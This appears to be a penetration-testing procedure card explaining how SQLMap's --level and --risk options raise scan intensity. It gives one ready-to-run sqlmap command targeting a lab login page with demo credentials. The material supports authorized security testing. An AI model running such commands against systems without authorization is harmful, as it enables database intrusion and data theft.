---
id: 910058f0-136a-4869-971a-3135592af826
name: SQLMap to Perform SQL Injection Using Extensive Techniques
type: procedure
verified: true
submitted: true
created_at: '2020-09-02T18:08:36.765823+00:00'
updated_at: '2023-05-26T18:50:02.261829+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[sqli]]'
- '[[SQLMap]]'
- '[[Web Applications]]'
commands:
- '[[SQLMap to Perform SQL Injection With Intense Level]]'
---

# SQLMap to Perform SQL Injection Using Extensive Techniques

**Status**: ✓ Verified

## Summary

SQLMap is an automated SQL injection testing tool. The tool can be used to test with different levels of payloads. --level and --risk options can be used to specify the intensity of scan. 

## Description

# Description

SQLMap is an automated SQL injection testing tool. The tool can be used to test with different levels of payloads. *--level* and *--risk *options can be used to specify the intensity of scan.



# Procedure



1. Use the following SQLMap command to exploit SQL injection on the application with level and risk options.







**Command** ([[SQLMap to Perform SQL Injection With Intense Level]]):

```bash
sqlmap -u 'http://192.168.1.10/vcart/login.php' --data='user=demo@vcart.com&pass=demo&selop=2' --level=5 --risk=3
```





## Platforms

- Web

## Commands Used

- [[SQLMap to Perform SQL Injection With Intense Level]]

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[sqli]]
- [[SQLMap]]
- [[Web Applications]]


